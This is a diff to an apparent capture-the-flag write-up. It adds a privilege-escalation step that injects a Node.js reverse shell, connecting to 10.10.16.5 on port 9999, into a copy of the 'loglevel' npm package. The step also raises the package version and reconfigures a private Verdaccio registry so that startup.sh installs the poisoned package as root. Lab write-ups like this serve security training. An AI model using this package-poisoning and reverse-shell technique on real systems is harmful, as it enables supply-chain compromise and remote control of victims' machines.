@@ -699,7 +699,54 @@ sudo /opt/app/startup.sh
 
 But it hangs, and my local registry tries to download "loglevel" from an official registry...
 
-May-be the package is somehow broken / incomplete. Let's download the officiel "loglevel" and tamper it afterwards. The startup script installs it in `.npm`, so just SCP it out of the box.
+May-be this minimal package is somehow broken / incomplete. Instead, we can download the original loglevel and add a reverse shell at the start of `loglevel.js`:
+
+```javascript
+(function(){
+    var net = require("net"),
+        cp = require("child_process"),
+        sh = cp.spawn("/bin/sh", []);
+    var client = new net.Socket();
+    client.connect(9999, "10.10.16.5", function(){
+        client.pipe(sh.stdin);
+        sh.stdout.pipe(client);
+        sh.stderr.pipe(client);
+    });
+    return /a/;
+})();
+```
+
+Modify `package.json` so that the version is higher:
+
+```json
+{
+  "name": "loglevel",
+  "description": "Minimal lightweight logging for JavaScript, adding reliable log level methods to any available console.log methods",
+  "version": "13.37.1",
+  "...": "..."
+}
+```
+
+And finally disable proxying on our private Verdaccio instance, to make sure our version of Loglevel is installed. In `conf/docker.yaml`:
+
+```yaml
+packages:
+  'loglevel':
+    access: $all
+    publish: $all
+  '@*/*':
+    access: $all
+    publish: $authenticated
+    unpublish: $authenticated
+    proxy: npmjs
+  '**':
+    access: $all
+    publish: $authenticated
+    unpublish: $authenticated
+    proxy: npmjs
+```
+
+Running `startup.sh` now triggers a reverse shell as root :)
 
 [author-profile]: https://app.hackthebox.com/users/389926
 [erms-repo]: https://www.sourcecodester.com/php/15160/simple-exam-reviewer-management-system-phpoop-free-source-code.html
